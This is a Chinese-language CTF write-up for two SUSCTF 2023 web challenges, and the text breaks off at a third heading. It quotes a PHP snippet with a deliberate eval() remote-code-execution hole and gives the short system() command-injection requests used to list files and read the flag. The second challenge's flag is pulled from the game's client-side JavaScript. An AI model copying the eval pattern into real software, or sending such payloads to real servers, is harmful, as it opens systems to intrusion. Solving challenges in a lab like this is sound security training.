---
title: SUSSEUWriteup
date: 2023-10-13 19:27:00.0
updated: 2023-10-13 07:33:56.897
url: /archives/susseuwriteup
categories: 
- CTF
tags: 
- writeup
---

# 0x00 [Web]PHP Is All You Need

## 题目描述

```php
<?php

// Revenge of last year's signin challenge
// Now you can't use a webshell tool to connect :)

isset($_REQUEST['cmd']) && strlen($_REQUEST['cmd']) < 20 && eval($_REQUEST['cmd']);

highlight_file(__FILE__);
```



## 题目解析

注意到，需要使用键为’cmd’作为参数提交，并且提交的值的长度小于20

第1次请求：`http://game.ctf.seusus.com:27160/?cmd=system("ls");`，注意结尾需要加分号，否则会报解析错误，新手容易犯。

得到如下结果：

```php
f1ag_6f5cd.php index.php <?php

// Revenge of last year's signin challenge
// Now you can't use a webshell tool to connect :)

isset($_REQUEST['cmd']) && strlen($_REQUEST['cmd']) < 20 && eval($_REQUEST['cmd']);

highlight_file(__FILE__);
```

观察到有 f1ag_6f5cd.php 文件

第2次请求：`http://game.ctf.seusus.com:27160/?cmd=system("tac f*"");`

得到flag：

```php
// susctf{PhP_1s_E4SY_165f22bea882} <?php

// Revenge of last year's signin challenge
// Now you can't use a webshell tool to connect :)

isset($_REQUEST['cmd']) && strlen($_REQUEST['cmd']) < 20 && eval($_REQUEST['cmd']);

highlight_file(__FILE__);
```

# 0x01 [Web] why not play a game

## 题目描述

点开玩游戏

## 题目解析

点开，提示if you got the maxscore 100000000000000000000000,i will show you flag :)

直接看 Javascript 源码即可，然后直接Ctrl+F搜maxScore即可

```javascript
...
var gameScore = 0;
//最高分
var maxScore = 1000000000000000000000000000000;
...

 if (gameScore > maxScore) {
            maxScore = gameScore;
            $('#maxScore').html(maxScore);
            localStorage.maxScore = maxScore;
            f14G="s"+"u"+"s"+"c"+"t"+"f{welcome_to_susctf_2023_ctf_is_so_fun}";
            alert('恭喜你创造了新纪录！f14G如下:'+f14G);
        }
        $('#gameOverModal').modal('show');
...
```

# 0x02 